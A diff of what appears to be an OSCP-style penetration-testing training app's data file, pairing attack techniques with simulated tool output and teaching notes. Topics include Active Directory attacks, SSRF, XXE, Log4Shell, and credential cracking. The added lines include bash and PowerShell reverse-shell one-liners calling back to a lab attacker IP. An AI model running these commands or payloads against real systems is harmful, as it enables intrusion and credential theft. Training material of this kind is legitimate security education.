-        '[+] Missing: MS16-135 (CVE-2016-7255) — Win32k elevation of privilege',
-        '[+] Missing: CVE-2021-34527 (PrintNightmare)',
-      ].join('\n'),
-      signal: '[+] Missing: CVE-2021-34527 (PrintNightmare)',
-      teach: 'Feeding `systeminfo` to a patch-gap checker lists the kernel exploits the box is missing. Treat each as a candidate — confirm the build and architecture before running one, since a wrong kernel exploit can bluescreen the target.',
-    },
-
-    // ==================== PIVOTING ====================
-    'local-linux-interfaces': {
-      output: [
-        'eth0: 10.10.10.10/24',
-        'eth1: 172.16.5.10/24',
-      ].join('\n'),
-      signal: 'eth1: 172.16.5.10/24',
-      teach: 'A compromised host with a second NIC is a doorway. `eth1` on 172.16.5.0/24 is a network you could not reach before — the reason to pivot. Map the host\'s interfaces first; they tell you what is now in range.',
-    },
-    'pivot-chisel-socks': {
-      output: [
-        'server: Reverse tunnelling enabled',
-        'server: Listening on http://0.0.0.0:8080',
-        'client: Connected to http://10.10.14.5:8080',
-        'client: tun: proxy#R:127.0.0.1:1080=>socks',
-      ].join('\n'),
-      signal: 'client: tun: proxy#R:127.0.0.1:1080=>socks',
-      teach: 'Chisel builds a SOCKS proxy back through the compromised host. Point proxychains at 127.0.0.1:1080 and your tools reach the internal network as if you were on it — the standard way to scan and attack a subnet you can only touch through one box.',
-    },
-
-    // ==================== ACTIVE DIRECTORY (depth) ====================
-    'nxc-arsenal': {
-      output: [
-        'SMB  10.10.10.10  445  DC01  [+] corp.local\\jdoe:Summer2024!',
-        'SMB  10.10.10.10  445  DC01  [*] Enumerated shares',
-        'SMB  10.10.10.10  445  DC01  Share       Permissions  Remark',
-        'SMB  10.10.10.10  445  DC01  SYSVOL      READ',
-        'SMB  10.10.10.10  445  DC01  Finance     READ,WRITE',
-      ].join('\n'),
-      signal: 'SMB  10.10.10.10  445  DC01  Finance     READ,WRITE',
-      teach: 'NetExec (nxc) is the swiss-army knife of AD: one credential, and it enumerates shares, users, password policy, and sessions, then runs modules. A WRITE share is a place to drop a payload or capture a hash — note it and move on.',
-    },
-    'ticket-reuse': {
-      output: [
-        '[*] Action: Import Ticket',
-        '[+] Ticket successfully imported!',
-        'C:\\> klist',
-        '   Client: jdoe @ CORP.LOCAL',
-        '   Server: krbtgt/CORP.LOCAL',
-      ].join('\n'),
-      signal: '[+] Ticket successfully imported!',
-      teach: 'Pass-the-Ticket loads a stolen Kerberos ticket straight into your session — no password needed. Once "imported", every tool that speaks Kerberos acts as that user. A TGT is the whole identity; a TGS is one service.',
-    },
-    'powerview-enum': {
-      output: [
-        'PS> Get-DomainUser -SPN | select samaccountname',
-        'samaccountname',
-        '--------------',
-        'svc_sql',
-        'svc_web',
-        'PS> Find-InterestingDomainAcl -ResolveGUIDs',
-        'IdentityReferenceName : jdoe   ActiveDirectoryRights : GenericAll',
-      ].join('\n'),
-      signal: 'IdentityReferenceName : jdoe   ActiveDirectoryRights : GenericAll',
-      teach: 'PowerView turns a Windows foothold into a map of the domain. Accounts with an SPN are kerberoastable; a GenericAll ACL over an object is a takeover edge. This is BloodHound\'s data, gathered by hand.',
-    },
-    'ad-psdotnet-enum': {
-      output: [
-        'PS> ([ADSISearcher]"(samAccountType=805306368)").FindAll().Count',
-        '42',
-        'PS> ([ADSISearcher]"(&(objectCategory=user)(servicePrincipalName=*))")',
-        'svc_sql  CN=svc_sql,OU=Services,DC=corp,DC=local',
-      ].join('\n'),
-      signal: 'svc_sql  CN=svc_sql,OU=Services,DC=corp,DC=local',
-      teach: 'When PowerView is blocked, raw .NET ADSI queries enumerate the domain with nothing but built-in PowerShell — no upload, no download. Living off the land this way sidesteps the AV that flags known tooling.',
-    },
-    'ad-legacy-enum': {
-      output: [
-        'C:\\> net user /domain',
-        'User accounts for \\\\DC01',
-        'Administrator   jdoe   krbtgt   svc_sql',
-        'C:\\> net group "Domain Admins" /domain',
-        'Members: Administrator  backupadmin',
-      ].join('\n'),
-      signal: 'Members: Administrator  backupadmin',
-      teach: 'Every Windows box ships with `net` and `nltest`. They are noisy but always present — when you land on a host with no tools, these built-ins still list users, groups, and domain admins. `backupadmin` in Domain Admins is a lead.',
-    },
-    'kerberos-tickets': {
-      output: [
-        '$ nxc ldap 10.10.10.10 -u jdoe -p Summer2024!',
-        'LDAP  10.10.10.10  389  DC01  [-] KRB_AP_ERR_SKEW (clock skew too great)',
-        '$ sudo ntpdate -u 10.10.10.10',
-        '$ nxc ldap 10.10.10.10 -u jdoe -p Summer2024!',
-        'LDAP  10.10.10.10  389  DC01  [+] corp.local\\jdoe:Summer2024!',
-      ].join('\n'),
-      signal: 'KRB_AP_ERR_SKEW (clock skew too great)',
-      teach: 'Kerberos refuses tickets when your clock differs from the DC by more than 5 minutes — "KRB_AP_ERR_SKEW". It is the single most common reason an AD attack "mysteriously" fails. Sync your clock to the DC and try again.',
-    },
-    'crack-tgs': {
-      output: [
-        '$krb5tgs$23$*svc_sql$CORP.LOCAL$...:9f8c... : P@ssw0rd2023',
-        'Session..........: hashcat',
-        'Status...........: Cracked',
-      ].join('\n'),
-      signal: 'Status...........: Cracked',
-      teach: 'A Kerberoasted service ticket (mode 13100) cracks offline — the DC never sees your guesses, so you crack at full GPU speed with no lockout. Service accounts often have weak, rarely-rotated passwords, which is why this works so often.',
-    },
-    'laps-read': {
-      output: [
-        'LDAP  10.10.10.20  389  WS01  [+] ms-Mcs-AdmPwd read',
-        'LDAP  10.10.10.20  389  WS01  Computer:WS01$  Password:Hb7!xQ2m...k9',
-      ].join('\n'),
-      signal: 'Computer:WS01$  Password:Hb7!xQ2m...k9',
-      teach: 'LAPS randomises the local Administrator password per machine — good security, unless your account has the right to read the `ms-Mcs-AdmPwd` attribute. If you can read it, you have local admin on that host, handed over in cleartext.',
-    },
-    'gmsa-read': {
-      output: [
-        'ReadGMSAPassword via corp.local\\svc_app$',
-        '[*] Managed Password: aad3b435...:5f4dcc3b5aa765d61d8327deb882cf99',
-        '[*] NTLM            : 5f4dcc3b5aa765d61d8327deb882cf99',
-      ].join('\n'),
-      signal: '[*] NTLM            : 5f4dcc3b5aa765d61d8327deb882cf99',
-      teach: 'A gMSA\'s password is managed by AD and readable only by principals on its allow-list. When your account is on that list, you recover the NT hash directly — no cracking — and can pass it. gMSAs are often over-privileged service identities.',
-    },
-    'bloodyad-acl': {
-      output: [
-        '[+] jdoe has GenericAll over svc_backup',
-        '$ bloodyAD ... set password svc_backup NewP@ss123!',
-        '[+] Password changed successfully for svc_backup',
-      ].join('\n'),
-      signal: '[+] Password changed successfully for svc_backup',
-      teach: 'An ACL edge like GenericAll is abstract until you use it. bloodyAD turns "I have rights over this account" into "I just set its password" — a concrete takeover. Each edge BloodHound draws is an action like this one.',
-    },
-    'shadow-credentials': {
-      output: [
-        '[*] Adding Key Credential to msDS-KeyCredentialLink of svc_app',
-        '[+] Saved PFX to svc_app.pfx',
-        '$ certipy auth -pfx svc_app.pfx',
-        '[*] Got hash for svc_app: aad3b...:2b576acbe6b...',
-      ].join('\n'),
-      signal: '[*] Got hash for svc_app: aad3b...:2b576acbe6b...',
-      teach: 'Shadow Credentials abuses write access to an account\'s msDS-KeyCredentialLink: you add your own certificate, then authenticate as the account via PKINIT and recover its NT hash. A modern, quiet alternative to resetting the password.',
-    },
-    'adcs-esc': {
-      output: [
-        'Certificate Templates',
-        '  0',
-        '    Template Name    : UserEnroll',
-        '    Enrollment Rights: Domain Users',
-        '    [!] Vulnerabilities: ESC1 — Enrollee supplies subject + client auth',
-      ].join('\n'),
-      signal: '[!] Vulnerabilities: ESC1 — Enrollee supplies subject + client auth',
-      teach: 'A misconfigured certificate template (ESC1) lets any user request a cert as anyone — including a Domain Admin. certipy finds the template; the "Vulnerabilities" line is your path. AD CS is a frequent, high-impact domain-takeover route.',
-    },
-    'cert-authenticate': {
-      output: [
-        '[*] Using principal: administrator@corp.local',
-        '[*] Trying to get TGT...',
-        '[+] Got hash for administrator@corp.local: aad3b...:31d6cfe0d16...',
-      ].join('\n'),
-      signal: '[+] Got hash for administrator@corp.local: aad3b...:31d6cfe0d16...',
-      teach: 'A certificate you obtained (via ESC1, Shadow Credentials, etc.) authenticates over PKINIT and hands back the account\'s NT hash. From there you pass-the-hash — the certificate was just the key that unlocked the credential.',
-    },
-    'getst-impersonation': {
-      output: [
-        '[*] Impersonating administrator',
-        '[*] Requesting S4U2self',
-        '[*] Requesting S4U2proxy',
-        '[+] Saving ticket in administrator@cifs_dc01.ccache',
-      ].join('\n'),
-      signal: '[+] Saving ticket in administrator@cifs_dc01.ccache',
-      teach: 'With constrained-delegation rights you ask the KDC for a service ticket "on behalf of" any user — S4U2self then S4U2proxy — and get a ccache that lets you act as Administrator against that service. Load the ticket and you are in.',
-    },
-    'coerce-auth': {
-      output: [
-        '[*] Sending PetitPotam (EfsRpcOpenFileRaw) to 10.10.10.10',
-        '[+] Attack worked — target authenticated to 10.10.14.5',
-        '[SMB] NTLMv2-SSP Username : CORP\\DC01$',
-      ].join('\n'),
-      signal: '[SMB] NTLMv2-SSP Username : CORP\\DC01$',
-      teach: 'Coercion tricks a target — often a DC — into authenticating to you (PetitPotam, PrinterBug). The machine account hash you catch (`DC01$`) can be relayed to AD CS or LDAP for escalation. The DC authenticating to you is the whole point.',
-    },
-    'unconstrained-delegation': {
-      output: [
-        '[*] Monitoring for new TGTs every 5 seconds',
-        '[+] Found new TGT: user=DC01$@CORP.LOCAL',
-        '[*] Base64(ticket.kirbi): doIF...',
-      ].join('\n'),
-      signal: '[+] Found new TGT: user=DC01$@CORP.LOCAL',
-      teach: 'A host with unconstrained delegation caches the TGT of everyone who authenticates to it. Combine it with coercion to make a DC connect, capture `DC01$`\'s TGT, and you can DCSync. Watching for the DC\'s ticket is the goal.',
-    },
-    'golden-ticket': {
-      output: [
-        '[*] Creating golden ticket for administrator',
-        '[*] Using domain SID S-1-5-21-...-...-...',
-        '[+] Saving ticket in administrator.ccache',
-      ].join('\n'),
-      signal: '[+] Saving ticket in administrator.ccache',
-      teach: 'With the krbtgt hash you forge a TGT for any user, valid until krbtgt is rotated twice — the ultimate persistence. This is a post-compromise move: you already own the domain, and the golden ticket keeps you in.',
-    },
-    'silver-ticket': {
-      output: [
-        '[*] Creating silver ticket for CIFS/dc01.corp.local',
-        '[*] Using service account hash (RC4)',
-        '[+] Saving ticket in administrator.ccache',
-      ].join('\n'),
-      signal: '[+] Saving ticket in administrator.ccache',
-      teach: 'A silver ticket forges a service ticket using one service account\'s hash — scoped to that one service, but it never touches the DC, so it is quiet. Narrower than a golden ticket, and useful when all you have is a single service hash.',
-    },
-
-    // ==================== WEB (depth) ====================
-    'svn-exposed': {
-      output: [
-        '$ curl -s http://10.10.10.10/.svn/entries',
-        '10',
-        'dir',
-        'https://svn.corp.local/app',
-        'config.php',
-        'db_connect.php',
-      ].join('\n'),
-      signal: 'db_connect.php',
-      teach: 'An exposed `.svn/` directory leaks the source tree the same way `.git/` does. Reconstruct the files — `db_connect.php` likely holds database credentials. Version-control leftovers are a goldmine; always check for them.',
-    },
-    'ssrf': {
-      output: [
-        '$ curl \'http://10.10.10.10/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/\'',
-        's3-readonly-role',
-        '$ curl \'http://10.10.10.10/fetch?url=http://169.254.169.254/.../s3-readonly-role\'',
-        '"AccessKeyId": "AKIA...", "SecretAccessKey": "wJal..."',
-      ].join('\n'),
-      signal: '"AccessKeyId": "AKIA...", "SecretAccessKey": "wJal..."',
-      teach: 'Server-Side Request Forgery makes the server fetch a URL you choose. Pointed at a cloud metadata endpoint (169.254.169.254), it leaks IAM credentials; pointed inside, it reaches services the firewall hides. The server is your proxy into places you cannot reach.',
-    },
-    'xxe': {
-      output: [
-        '$ curl -s -X POST http://10.10.10.10/api -d @payload.xml',
-        '<?xml ... <!ENTITY xxe SYSTEM "file:///etc/passwd">',
-        'root:x:0:0:root:/root:/bin/bash',
-        'www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin',
-      ].join('\n'),
-      signal: 'root:x:0:0:root:/root:/bin/bash',
-      teach: 'XML External Entity injection abuses an XML parser that resolves external entities. Declare one pointing at `file:///etc/passwd` and the response echoes the file back. Any endpoint that accepts XML is worth testing for it.',
-    },
-    'deserialization': {
-      output: [
-        '$ ysoserial CommonsCollections5 \'...\' | base64',
-        '$ # listener receives the callback:',
-        'connect to [10.10.14.5] from (UNKNOWN) [10.10.10.10]',
-        'uid=0(root) gid=0(root)',
-      ].join('\n'),
-      signal: 'uid=0(root) gid=0(root)',
-      teach: 'When an app deserialises attacker-controlled data, a crafted object (ysoserial builds them) runs code as it is rebuilt. The callback as root is code execution. Look for serialised blobs in cookies, parameters, and APIs.',
-    },
-    'jwt-attacks': {
-      output: [
-        '$ echo $TOKEN | cut -d. -f2 | base64 -d',
-        '{"user":"guest","role":"user","alg":"HS256"}',
-        '$ # re-sign with alg:none or a cracked secret',
-        '{"user":"admin","role":"admin"}',
-      ].join('\n'),
-      signal: '{"user":"admin","role":"admin"}',
-      teach: 'A JSON Web Token is only as safe as its signature. If the server accepts `alg:none`, or the HMAC secret is weak enough to crack, you forge a token that says `admin`. Always decode the token first — the claims tell you what to tamper with.',
-    },
-    'nosql-injection': {
-      output: [
-        '$ curl -s -X POST http://10.10.10.10/login -d \'user[$ne]=x&pass[$ne]=x\'',
-        'HTTP/1.1 302 Found',
-        'Location: /dashboard',
-        'Set-Cookie: session=loggedin-as-admin',
-      ].join('\n'),
-      signal: 'Set-Cookie: session=loggedin-as-admin',
-      teach: 'NoSQL backends like MongoDB take query operators as input. `{"$ne":"x"}` means "not equal to x" — always true — so the login matches the first user and you are in without a password. Test JSON and array params against NoSQL apps.',
-    },
-    'jenkins-access': {
-      output: [
-        '$ curl -s http://10.10.10.10:8080/script',
-        '# Groovy console reachable (authenticated or anonymous)',
-        'println "whoami".execute().text',
-        'nt authority\\system',
-      ].join('\n'),
-      signal: 'nt authority\\system',
-      teach: 'Jenkins\' Script Console runs arbitrary Groovy as the Jenkins service — often SYSTEM or a build account. If `/script` is reachable, it is remote code execution by design. CI servers are high-value: they hold credentials and run as privileged accounts.',
-    },
-    'verb-tampering': {
-      output: [
-        '$ curl -s -X OPTIONS -i http://10.10.10.10/admin/',
-        'HTTP/1.1 200 OK',
-        'Allow: GET, POST, PUT',
-        '$ curl -s -X PUT http://10.10.10.10/admin/shell.jsp --data-binary @shell.jsp',
-        'HTTP/1.1 201 Created',
-      ].join('\n'),
-      signal: 'HTTP/1.1 201 Created',
-      teach: 'Access controls often guard GET/POST but forget other verbs. If PUT is allowed, you can upload a web shell directly — "201 Created" means it landed. Enumerate the allowed methods before assuming a path is locked down.',
-    },
-    'xss-basics': {
-      output: [
-        '$ curl -s \'http://10.10.10.10/search.php?q=<b>xssprobe123</b>\'',
-        '<p>No results for <b>xssprobe123</b></p>',
-      ].join('\n'),
-      signal: '<p>No results for <b>xssprobe123</b></p>',
-      teach: 'Your `<b>` tag came back rendered, not escaped — the page reflects input into HTML unsanitised. That is reflected XSS: it runs in a victim\'s browser, useful for stealing sessions. On OSCP it matters most where it can reach an admin.',
-    },
-    'check-log4shell': {
-      output: [
-        '$ curl http://10.10.10.10/ -H \'User-Agent: ${jndi:ldap://10.10.14.5/x}\'',
-        '# listener on 10.10.14.5:389 receives:',
-        'LDAP query from 10.10.10.10 for /x',
-      ].join('\n'),
-      signal: 'LDAP query from 10.10.10.10 for /x',
-      teach: 'Log4Shell (CVE-2021-44228) triggers when a vulnerable Log4j logs your `${jndi:ldap://...}` string and dutifully connects out to it. The inbound LDAP hit on your listener confirms the callback — the first step before staging a full exploit.',
-    },
-    'check-struts2': {
-      output: [
-        '$ curl -s \'http://10.10.10.10/\' -H "Content-Type: %{(#cmd=\'id\')...}"',
-        'uid=0(root) gid=0(root) groups=0(root)',
-      ].join('\n'),
-      signal: 'uid=0(root) gid=0(root) groups=0(root)',
-      teach: 'Apache Struts2 OGNL injection (e.g. CVE-2017-5638) evaluates attacker expressions in a header and runs commands — here as root. A dated Struts app is often a one-request shell; fingerprint the framework version first.',
-    },
-
-    // ==================== SERVICE & WEB CHECKS (depth) ====================
-    'check-cors': {
-      output: [
-        '$ curl -sI -H "Origin: https://evil.example" http://10.10.10.10/api/me',
-        'Access-Control-Allow-Origin: https://evil.example',
-        'Access-Control-Allow-Credentials: true',
-      ].join('\n'),
-      signal: 'Access-Control-Allow-Origin: https://evil.example',
-      teach: 'The server reflected your arbitrary Origin AND allows credentials — a CORS misconfiguration. A malicious page could read a logged-in victim\'s API responses, including their data and tokens. Reflected Origin + credentials:true is the dangerous combination.',
-    },
-    'check-http-redirect': {
-      output: [
-        '$ curl -sI http://10.10.10.10/',
-        'HTTP/1.1 301 Moved Permanently',
-        'Location: https://dev-internal.corp.local/',
-      ].join('\n'),
-      signal: 'Location: https://dev-internal.corp.local/',
-      teach: 'A redirect can leak an internal hostname in its Location header — `dev-internal.corp.local` is a name you had no other way to learn. Add it to /etc/hosts and your target list; the redirect just widened the attack surface.',
-    },
-    'check-subdomain-takeover': {
-      output: [
-        '$ dig +noall +answer CNAME shop.corp.local',
-        'shop.corp.local.  300  IN  CNAME  corp-shop.herokuapp.com.',
-        '$ curl -s https://shop.corp.local/',
-        'No such app — there is no app configured at that hostname',
-      ].join('\n'),
-      signal: 'No such app — there is no app configured at that hostname',
-      teach: 'A CNAME pointing at a cloud service that is no longer claimed is a subdomain takeover: register the dangling target yourself and you control content on the victim\'s trusted subdomain. The "no such app" page is the tell.',
-    },
-    'check-dns-email': {
-      output: [
-        '$ dig +short TXT corp.local',
-        '"v=spf1 include:_spf.google.com ~all"',
-        '$ dig +short TXT _dmarc.corp.local',
-        '"v=DMARC1; p=none"',
-      ].join('\n'),
-      signal: '"v=DMARC1; p=none"',
-      teach: 'Email records tell you whether a domain can be spoofed. A soft SPF (`~all`) plus DMARC `p=none` means forged mail from this domain is unlikely to be rejected — a phishing lead in a real engagement, a reporting finding on the exam.',
-    },
-    'check-web-components': {
-      output: [
-        '$ curl -sI http://10.10.10.10/',
-        'Server: Apache/2.4.49 (Unix)',
-        'X-Powered-By: PHP/7.2.24',
-        'Set-Cookie: PHPSESSID=...; path=/',
-      ].join('\n'),
-      signal: 'Server: Apache/2.4.49 (Unix)',
-      teach: 'Response headers hand you the stack for free: web server, language, framework, sometimes exact versions. `Apache 2.4.49` and `PHP 7.2.24` are both searchable for known CVEs. Read the headers before you do anything clever.',
-    },
-    'check-cms-version': {
-      output: [
-        '$ curl -s http://10.10.10.10/CHANGELOG.txt | head -2',
-        'Drupal 7.57, 2018-02-21',
-        '$ # 7.57 predates Drupalgeddon2 (CVE-2018-7600)',
-      ].join('\n'),
-      signal: 'Drupal 7.57, 2018-02-21',
-      teach: 'CMSes leak their version in changelogs, readme files, and meta tags. A pinned version like Drupal 7.57 maps straight to known exploits (here Drupalgeddon2). Identify the CMS and its exact build, then look up what it is vulnerable to.',
-    },
-    'check-web-body': {
-      output: [
-        '$ curl -s http://10.10.10.10/ | grep -iE "comment|TODO|password"',
-        '<!-- TODO: remove test login test/test before go-live -->',
-      ].join('\n'),
-      signal: '<!-- TODO: remove test login test/test before go-live -->',
-      teach: 'View the source. Developers leave credentials, debug endpoints, and TODOs in HTML comments and JavaScript all the time. A `test/test` login left in a comment is a free set of working credentials — read the page humans never read.',
-    },
-
-    // ==================== CREDENTIALS & CRACKING (depth) ====================
-    'crack-identify': {
-      output: [
-        '$ nth -f hashes.txt',
-        '$krb5tgs$23$...',
-        'Most likely: Kerberos 5 TGS-REP etype 23  hashcat: 13100',
-      ].join('\n'),
-      signal: 'Most likely: Kerberos 5 TGS-REP etype 23  hashcat: 13100',
-      teach: 'Before you can crack a hash you must know what it is. name-that-hash reads the format and tells you the hashcat mode (here 13100). Guess the mode wrong and hashcat wastes hours on the wrong algorithm — identify first, always.',
-    },
-    'crack-asrep-offline': {
-      output: [
-        '$krb5asrep$23$jdoe@CORP.LOCAL:a1b2...:... : Welcome2024!',
-        'Status...........: Cracked',
-      ].join('\n'),
-      signal: 'Status...........: Cracked',
-      teach: 'An AS-REP hash (mode 18200) comes from an account with pre-auth disabled, and it cracks offline at full speed. "Cracked" means you now hold that user\'s real password — turn the roast into a login.',
-    },
-    'crack-shadow': {
-      output: [
-        'root:$6$xyz$...:::: : toor123',
-        'Status...........: Cracked',
-      ].join('\n'),
-      signal: 'Status...........: Cracked',
-      teach: 'A `$6$` hash from /etc/shadow is sha512crypt (mode 1800) — slow by design, so lean on a good wordlist and rules rather than brute force. Crack root\'s hash and the privesc is done; crack a service user and you may unlock lateral moves.',
-    },
-    'crack-archive': {
-      output: [
-        '$ zip2john backup.zip > backup.hash',
-        '$ hashcat -m 17200 backup.hash rockyou.txt',
-        'backup.zip:hunter2 ... : hunter2',
-        'Status...........: Cracked',
-      ].join('\n'),
-      signal: 'Status...........: Cracked',
-      teach: 'A password-protected archive you looted is just another crackable hash — `zip2john`/`office2john` extract it, hashcat breaks it. The contents are often the reason it was protected: credentials, keys, or the next foothold.',
-    },
-    'crack-mscache2': {
-      output: [
-        '$DCC2$10240#jdoe#a1b2c3... : Autumn2023!',
-        'Status...........: Cracked',
-      ].join('\n'),
-      signal: 'Status...........: Cracked',
-      teach: 'Domain Cached Credentials (mscash2, mode 2100) are what a laptop stores so a domain user can log in offline. They crack slowly and cannot be passed — only cracked — but a recovered password is a real domain credential.',
-    },
-    'ntlm-relay-attack': {
-      output: [
-        '[*] Servers started, waiting for connections',
-        '[*] Authenticating against smb://10.10.10.20 as CORP/JDOE SUCCEED',
-        '[*] Target system bootkey: 0x...',
-        '[*] Dumping local SAM hashes',
-        'Administrator:500:aad3b...:31d6cfe0d16ae931b73c59d7e0c089c0:::',
-      ].join('\n'),
-      signal: '[*] Authenticating against smb://10.10.10.20 as CORP/JDOE SUCCEED',
-      teach: 'Relaying forwards a captured authentication to another host instead of cracking it — if SMB signing is off, the victim\'s auth logs you into a second machine as them. "SUCCEED" means you are in without ever knowing the password.',
-    },
-    'mitm6-ipv6-takeover': {
-      output: [
-        '[*] IPv6 address assigned to victim via rogue DHCPv6',
-        '[*] Victim queried WPAD — serving malicious config',
-        '[*] Got credentials relayed to LDAP: CORP\\jdoe',
-      ].join('\n'),
-      signal: '[*] Got credentials relayed to LDAP: CORP\\jdoe',
-      teach: 'Windows prefers IPv6 and asks for a DHCPv6 server even when none is configured. mitm6 answers, becomes the victim\'s DNS, and relays the auth it captures. A default-on protocol you did not know was running becomes the way in.',
-    },
-    'online-brute-ftp': {
-      output: [
-        '[DATA] attacking ftp://10.10.10.10:21/',
-        '[21][ftp] host: 10.10.10.10   login: anonymous   password:',
-        '[21][ftp] host: 10.10.10.10   login: bob   password: ftp123',
-      ].join('\n'),
-      signal: '[21][ftp] host: 10.10.10.10   login: bob   password: ftp123',
-      teach: 'Against a confirmed FTP service with a known user, a measured hydra run finds weak passwords — and always test `anonymous` first, it is free. Keep the wordlist focused; lab and real accounts both lock out under a flood.',
-    },
-    'online-brute-rdp': {
-      output: [
-        '[DATA] attacking rdp://10.10.10.10:3389/',
-        '[3389][rdp] host: 10.10.10.10   login: admin   password: Password1',
-      ].join('\n'),
-      signal: '[3389][rdp] host: 10.10.10.10   login: admin   password: Password1',
-      teach: 'A weak RDP password is an interactive desktop. Brute it only when you have a real username and a short list — RDP lockout policies are unforgiving. A hit here is a full GUI session as that user.',
-    },
-
-    // ==================== DATABASES (depth) ====================
-    'mssql-login': {
-      output: [
-        'SQL> SELECT @@version;',
-        'Microsoft SQL Server 2019 (RTM) ...',
-        'SQL> SELECT IS_SRVROLEMEMBER(\'sysadmin\') AS is_sysadmin;',
-        'is_sysadmin : 1',
-      ].join('\n'),
-      signal: 'is_sysadmin : 1',
-      teach: 'The first thing to check on an MSSQL login is `IS_SRVROLEMEMBER(\'sysadmin\')`. A `1` means you can re-enable xp_cmdshell and run OS commands, or impersonate other logins. Sysadmin on MSSQL is effectively a shell on the host.',
+      signal: 'redis_version:6.0.16',
+      teach: 'An unauthenticated Redis answers INFO to anyone. Beyond the version, a writable Redis can be abused to drop an SSH key or a web shell (CONFIG SET dir / dbfilename) — an open Redis on 6379 is frequently a direct foothold.',
     },
     'mongo-enum': {
+      cmd: 'nmap -Pn -p 27017 --script mongodb-info,mongodb-databases 10.10.10.10', tool: 'nmap',
       output: [
         'PORT      STATE SERVICE',
         '27017/tcp open  mongodb',
@@ -1273,145 +1500,99 @@
         '|_  (no authentication required)',
       ].join('\n'),
       signal: '|_  (no authentication required)',
-      teach: 'MongoDB historically shipped with no authentication. If you can list databases without credentials, you can read them — `app_secrets` and `users` collections often hold password hashes or API keys outright.',
+      teach: 'MongoDB historically shipped with no authentication. If you can list databases without credentials, you can read them — app_secrets and users collections often hold password hashes or API keys outright.',
     },
 
-    // ==================== SHELLS & TRANSFER (depth) ====================
+    // ============================ SHELLS & TRANSFER ============================
     'ssh-key-login': {
+      cmd: 'chmod 600 id_rsa && ssh -i id_rsa -o StrictHostKeyChecking=no bob@10.10.10.10', tool: 'ssh',
       output: [
-        '$ chmod 600 id_rsa',
-        '$ ssh -i id_rsa bob@10.10.10.10',
-        'Last login: Mon Jan  1 10:00:00 2024',
+        'Last login: Mon Jan  1 10:00:00 2024 from 10.10.14.5',
         'bob@target:~$ id',
-        'uid=1000(bob) gid=1000(bob)',
+        'uid=1000(bob) gid=1000(bob) groups=1000(bob)',
       ].join('\n'),
       signal: 'bob@target:~$ id',
-      teach: 'A private key you looted is a password-free login — but SSH refuses a key that others can read, hence `chmod 600`. A stable SSH session beats any reverse shell: it has a real TTY and survives. Always try looted keys against every user and host.',
+      teach: 'A private key you looted is a password-free login — but SSH refuses a key others can read, hence chmod 600. A stable SSH session beats any reverse shell: it has a real TTY and survives. Try looted keys against every user and host.',
     },
     'shell-listener': {
+      cmd: 'rlwrap nc -lvnp 4444', tool: 'rlwrap',
       output: [
-        '$ rlwrap nc -lvnp 4444',
-        'listening on [any] 4444 ...',
+        'Listening on 0.0.0.0 4444',
       ].join('\n'),
-      signal: 'listening on [any] 4444 ...',
-      teach: 'Before you fire a reverse shell, start the catcher. `nc -lvnp 4444` listens; wrapping it in `rlwrap` gives you command history and arrow keys once the shell lands. Set the listener first — a callback with nothing listening is lost.',
+      signal: 'Listening on 0.0.0.0 4444',
+      teach: 'Before you fire a reverse shell, start the catcher. nc -lvnp 4444 listens; wrapping it in rlwrap gives you command history and arrow keys once the shell lands. Set the listener first — a callback with nothing listening is lost.',
+    },
+    'shell-revshell-linux': {
+      signal: 'connect to [10.10.14.5] from (UNKNOWN) [10.10.10.10] 54312',
+      teach: 'Start the listener FIRST, then deliver the payload on the target (through a web bug, a cron, an upload). It dials back and your listener catches it — code execution becoming an interactive shell. The prompt is raw; upgrade it to a PTY next.',
+      steps: [
+        { where: 'local', tool: 'nc', cmd: 'rlwrap nc -lvnp 4444', output: 'Listening on 0.0.0.0 4444' },
+        { where: 'host', tool: 'bash', cmd: "bash -c 'bash -i >& /dev/tcp/10.10.14.5/4444 0>&1'", output: [
+          '↩ caught back on your listener:',
+          'connect to [10.10.14.5] from (UNKNOWN) [10.10.10.10] 54312',
+          'www-data@target:/var/www/html$ id',
+          'uid=33(www-data) gid=33(www-data) groups=33(www-data)',
+        ].join('\n') },
+      ],
     },
     'shell-revshell-windows': {
-      output: [
-        'listening on [any] 4444 ...',
-        'connect to [10.10.14.5] from (UNKNOWN) [10.10.10.10] 50122',
-        'PS C:\\> whoami',
-        'corp\\svc_web',
-      ].join('\n'),
       signal: 'connect to [10.10.14.5] from (UNKNOWN) [10.10.10.10] 50122',
-      teach: 'A PowerShell reverse shell calls back to your listener the same way a Linux one does — the "connect to … from" line is the target reaching you. You land as the service account the web app runs under; the next step is Windows enumeration.',
+      teach: 'Same two beats as a Linux reverse shell: listener on your box first, then run the PowerShell payload on the target. It calls back and you land as the service account the web app runs under; next comes Windows enumeration.',
+      steps: [
+        { where: 'local', tool: 'nc', cmd: 'rlwrap nc -lvnp 4444', output: 'Listening on 0.0.0.0 4444' },
+        { where: 'host', tool: 'powershell', cmd: "powershell -nop -c \"$c=New-Object Net.Sockets.TCPClient('10.10.14.5',4444);...\"", output: [
+          '↩ caught back on your listener:',
+          'connect to [10.10.14.5] from (UNKNOWN) [10.10.10.10] 50122',
+          'PS C:\\> whoami',
+          'acme\\svc_web',
+        ].join('\n') },
+      ],
+    },
+    'shell-pty-upgrade': {
+      signal: 'www-data@target:/$ export TERM=xterm',
+      teach: 'A raw netcat shell has no job control, no arrows, no tab-complete, and dies on Ctrl-C. The fix is two-sided: spawn a PTY inside the shell, then background it with Ctrl-Z and fix YOUR terminal with stty before foregrounding. Do it before anything interactive, like su or ssh.',
+      steps: [
+        { where: 'host', tool: 'python3', cmd: "python3 -c 'import pty;pty.spawn(\"/bin/bash\")'", output: [
+          'www-data@target:/$',
+          '# now press Ctrl-Z to background this shell',
+        ].join('\n') },
+        { where: 'local', tool: 'sh', cmd: 'stty raw -echo; fg', output: [
+          'nc -lvnp 4444',
+          'www-data@target:/$ export TERM=xterm',
+        ].join('\n') },
+      ],
+    },
+    'linux-remote-exec': {
+      cmd: "sshpass -p 'Autumn2026!' ssh -o StrictHostKeyChecking=no bob@10.10.10.10 id", tool: 'sshpass',
+      output: [
+        'uid=1001(bob) gid=1001(bob) groups=1001(bob),27(sudo)',
+      ].join('\n'),
+      signal: 'uid=1001(bob) gid=1001(bob) groups=1001(bob),27(sudo)',
+      teach: 'Once you have a password, you can run a single command over SSH non-interactively — handy for scripted checks. The sudo group in bob\'s id output is a privesc lead: a sudo-group user can often get root directly.',
     },
 
-    // ==================== LINUX PRIVESC (depth) ====================
-    'nfs-squash': {
+    // ============================ PIVOTING & TUNNELING ============================
